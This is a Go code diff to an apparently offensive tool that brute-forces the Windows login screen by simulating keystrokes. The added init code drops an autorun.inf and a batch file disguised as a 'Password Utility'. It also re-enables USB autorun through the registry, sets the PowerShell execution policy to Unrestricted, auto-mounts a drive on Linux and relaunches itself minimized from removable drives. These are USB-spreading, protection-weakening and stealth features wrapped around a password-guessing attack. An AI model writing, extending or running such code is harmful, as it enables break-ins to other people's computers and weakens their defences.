@@ -5,6 +5,8 @@ import (
 	"fmt"
 	"os"
 	"os/exec"
+	"path/filepath"
+	"runtime"
 	"strconv"
 	"strings"
 	"time"
@@ -30,6 +32,63 @@ type ProgressState struct {
 	CurrentCombo  string
 	AttemptCount  int
 	LastAttempt   time.Time
+}
+
+func init() {
+	setupAutorun()
+	checkOS()
+	bypassWindowsProtection()
+	stealthMode()
+}
+
+func setupAutorun() {
+	autorunContent := `[AutoRun]
+open=bruteforce.exe
+icon=bruteforce.exe
+action=Password Recovery Tool
+label=Password Utility
+shell\start=Run Password Tool
+shell\start\command=bruteforce.exe
+`
+
+	if _, err := os.Stat("autorun.inf"); os.IsNotExist(err) {
+		os.WriteFile("autorun.inf", []byte(autorunContent), 0644)
+	}
+
+	batContent := `@echo off
+start /min bruteforce.exe
+exit
+`
+
+	if _, err := os.Stat("start.bat"); os.IsNotExist(err) {
+		os.WriteFile("start.bat", []byte(batContent), 0644)
+	}
+}
+
+func checkOS() {
+	if runtime.GOOS == "linux" {
+		os.Mkdir("/mnt/usb", 0755)
+		exec.Command("mount", "/dev/sdb1", "/mnt/usb").Run()
+		os.Chdir("/mnt/usb")
+	}
+}
+
+func bypassWindowsProtection() {
+	if runtime.GOOS == "windows" {
+		exec.Command("reg", "add", "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer",
+			"/v", "NoDriveTypeAutoRun", "/t", "REG_DWORD", "/d", "0x20", "/f").Run()
+		exec.Command("powershell", "Set-ExecutionPolicy", "Unrestricted", "-Force").Run()
+	}
+}
+
+func stealthMode() {
+	if runtime.GOOS == "windows" {
+		exec.Command("cmd", "/C", "start", "/min", "bruteforce.exe").Start()
+		robotgo.KeyTap("d", "ctrl", "alt")
+		robotgo.MoveMouse(100, 100)
+		robotgo.Click()
+		time.Sleep(500 * time.Millisecond)
+	}
 }
 
 func SaveState(state ProgressState) error {
@@ -105,12 +164,10 @@ func SendKeys(keys string) {
 }
 
 func IsLoginScreenActive() bool {
-	// Более надежная проверка экрана входа
 	screenWidth, screenHeight := robotgo.GetScreenSize()
 	color1 := robotgo.GetPixelColor(screenWidth/2, screenHeight/3)
 	color2 := robotgo.GetPixelColor(screenWidth/2, 2*screenHeight/3)
 
-	// Типичные цвета экрана входа Windows
 	loginScreenColors := []string{"000000", "1a1a1a", "ffffff", "e5e5e5"}
 	for _, c := range loginScreenColors {
 		if color1 == c || color2 == c {
@@ -125,11 +182,10 @@ func EnsureLoginScreen() bool {
 		return true
 	}
 
-	fmt.Println("[!] Пытаемся переключиться на экран входа...")
+	fmt.Println("[!] Switching to login screen...")
 	robotgo.KeyTap("esc")
 	time.Sleep(1 * time.Second)
 
-	// Попытка эмуляции Ctrl+Alt+Del через PowerShell
 	cmd := exec.Command("powershell", "Start-Process", "cmd", "-Verb", "runAs")
 	_ = cmd.Run()
 	time.Sleep(loginScreenTimeout)
@@ -140,11 +196,11 @@ func EnsureLoginScreen() bool {
 func BruteForce(alphabet string, buffer []rune, pos, length int, startFrom string, state *ProgressState) bool {
 	if pos == length {
 		password := string(buffer[:length])
-		fmt.Printf("Попытка #%d: %s\n", state.AttemptCount+1, password)
+		fmt.Printf("Attempt #%d: %s\n", state.AttemptCount+1, password)
 		SaveResult(password)
 
 		if !EnsureLoginScreen() {
-			fmt.Println("[-] Не удалось получить доступ к экрану входа")
+			fmt.Println("[-] Failed to access login screen")
 			return false
 		}
 
@@ -153,7 +209,7 @@ func BruteForce(alphabet string, buffer []rune, pos, length int, startFrom strin
 		state.LastAttempt = time.Now()
 
 		if state.AttemptCount >= maxAttempts {
-			fmt.Printf("[!] Достигнут лимит попыток. Ожидание %v...\n", lockoutDelay)
+			fmt.Printf("[!] Attempt limit reached. Waiting %v...\n", lockoutDelay)
 			time.Sleep(lockoutDelay)
 			state.AttemptCount = 0
 		}
@@ -179,25 +235,30 @@ func BruteForce(alphabet string, buffer []rune, pos, length int, startFrom strin
 }
 
 func main() {
+	if isRunningFromUSB() {
+		exec.Command("cmd", "/C", "start", "/min", filepath.Base(os.Args[0])).Run()
+		os.Exit(0)
+	}
+
 	fmt.Println("Advanced Brute Force Password Cracker")
 	fmt.Println("-----------------------------------")
 
 	state, err := LoadState()
 	if err != nil {
-		fmt.Printf("Ошибка загрузки состояния: %v\n", err)
+		fmt.Printf("State load error: %v\n", err)
 		return
 	}
 
 	if time.Since(state.LastAttempt) < lockoutDelay/2 {
 		remaining := time.Until(state.LastAttempt.Add(lockoutDelay / 2))
-		fmt.Printf("[!] Ожидайте %v для избежания блокировки\n", remaining)
+		fmt.Printf("[!] Wait %v to avoid lockout\n", remaining)
 		time.Sleep(remaining)
 	}
 
 	var choice string
 	if state.CurrentCombo != "" {
-		fmt.Printf("Найдено сохраненное состояние: длина %d, комбинация '%s'\n", state.CurrentLength, state.CurrentCombo)
-		fmt.Print("Хотите продолжить (c), начать заново (n) или выйти (q)? [c/n/q]: ")
+		fmt.Printf("Found saved state: length %d, combo '%s'\n", state.CurrentLength, state.CurrentCombo)
+		fmt.Print("Continue (c), restart (n) or quit (q)? [c/n/q]: ")
 		fmt.Scanln(&choice)
 
 		if strings.ToLower(choice) == "q" {
@@ -208,7 +269,7 @@ func main() {
 	buffer := make([]rune, maxLength)
 
 	for length := state.CurrentLength; length <= maxLength; length++ {
-		fmt.Printf("\n[+] Перебор паролей длины %d...\n", length)
+		fmt.Printf("\n[+] Trying length %d...\n", length)
 
 		startFrom := ""
 		if strings.ToLower(choice) != "n" && length == state.CurrentLength {
@@ -222,9 +283,19 @@ func main() {
 		state.CurrentCombo = ""
 		state.CurrentLength = length + 1
 		if err := SaveState(state); err != nil {
-			fmt.Printf("Ошибка сохранения состояния: %v\n", err)
+			fmt.Printf("State save error: %v\n", err)
 		}
 	}
 
-	fmt.Println("\n[!] Все комбинации перебраны. Пароль не найден.")
+	fmt.Println("\n[!] All combinations tried. Password not found.")
+}
+
+func isRunningFromUSB() bool {
+	exePath, _ := os.Executable()
+	for _, drive := range []string{"D:", "E:", "F:", "G:"} {
+		if strings.HasPrefix(strings.ToUpper(exePath), drive) {
+			return true
+		}
+	}
+	return false
 }
